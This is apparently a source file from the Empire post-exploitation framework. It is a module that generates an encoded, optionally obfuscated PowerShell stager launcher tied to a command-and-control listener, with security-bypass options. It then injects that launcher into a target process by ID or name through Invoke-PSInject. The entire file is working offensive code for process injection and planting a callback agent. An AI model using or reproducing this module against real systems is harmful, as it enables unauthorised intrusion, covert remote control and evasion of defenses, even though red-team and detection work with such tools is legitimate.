from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        # staging options
        listener_name = params["Listener"]
        proc_id = params["ProcId"].strip()
        proc_name = params["ProcName"].strip()
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if proc_id == "" and proc_name == "":
            raise ModuleValidationException(
                "[!] Either ProcID or ProcName must be specified."
            )

        script_end = ""
        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language="powershell",
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            encode=True,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
            bypasses=params["Bypasses"],
        )
        MAX_LAUNCHER_LEN = 5952
        if launcher == "":
            raise ModuleValidationException("Error in launcher generation.")
        if len(launcher) > MAX_LAUNCHER_LEN:
            raise ModuleValidationException("Launcher string is too long!")

        launcher_code = launcher.split(" ")[-1]

        if proc_id != "":
            script_end += f"Invoke-PSInject -ProcID {proc_id} -PoshCode {launcher_code}"
        else:
            script_end += (
                f"Invoke-PSInject -ProcName {proc_name} -PoshCode {launcher_code}"
            )

        return script, script_end
